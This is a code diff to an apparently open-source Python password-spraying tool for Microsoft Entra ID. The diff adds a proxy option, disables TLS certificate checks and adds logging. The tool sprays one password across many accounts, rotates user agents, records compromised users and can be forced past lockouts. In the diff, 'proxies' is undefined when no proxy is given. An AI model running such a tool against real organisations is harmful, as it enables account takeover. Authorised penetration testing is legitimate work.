@@ -7,6 +7,7 @@ import random
 import sys
 import os
 import shutil
+import urllib3
 
 
 def log_message(message, full_log, compromised_users_log=None, color=None):
@@ -87,6 +88,13 @@ def parse_arguments():
         help="Force the spray to continue even if multiple account lockouts are detected.",
     )
     parser.add_argument(
+        "-x",
+        "--proxy",
+        type=str,
+        required=False,
+        help="Specify a proxy host to send all traffic through (e.g., http://your-proxy-host:port)",
+    )
+    parser.add_argument(
         "--debug",
         default=False,
         action="store_true",
@@ -97,7 +105,7 @@ def parse_arguments():
 
 
 def entra_spray(
-    url, user_list_file, password, delay, user_agents_file, force, verbose, debug
+    url, user_list_file, password, delay, user_agents_file, force, verbose, proxy, debug
 ):
     usernames = [line.strip() for line in open(user_list_file)]
     user_agents = [line.strip() for line in open(user_agents_file)]
@@ -106,7 +114,7 @@ def entra_spray(
     lockoutquestion = 0
     compromised_users = []
 
-    output_directory = datetime.now().strftime("output/%d-%m-%Y_%H:%M:%S")
+    output_directory = datetime.now().strftime("output/%d-%m-%Y_%H-%M-%S")
     create_directory(output_directory)
 
     # backup original userlist input file
@@ -123,6 +131,10 @@ def entra_spray(
     with open(full_log_filename, "w") as full_log, open(
         compromised_users_log_filename, "w"
     ) as compromised_user_log:
+        log_message(
+            f"[*] Logging output to {output_directory}",
+            full_log,
+        )
         log_message(
             f"[*] There are {count} total users to spray.",
             full_log,
@@ -161,6 +173,13 @@ def entra_spray(
                 log_message(f"[*] Headers: {post_headers}", full_log)
                 log_message(f"[*] Data: {body_params}", full_log)
 
+            if proxy:
+                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                proxies = {
+                    'http': proxy,
+                    'https': proxy,
+                }
+
             # Add "X-My-X-Forwarded-For" header for Firprox (if "microsoft" is not in the url value)
             r = requests.post(
                 f"{url}/common/oauth2/token",
@@ -173,6 +192,8 @@ def entra_spray(
                     ),
                 },
                 data=body_params,
+                proxies=proxies,
+                verify=False,
             )
 
             if debug:
@@ -348,6 +369,7 @@ def main():
         user_agents_file,
         args.force,
         args.verbose,
+        args.proxy,
         args.debug,
     )
 
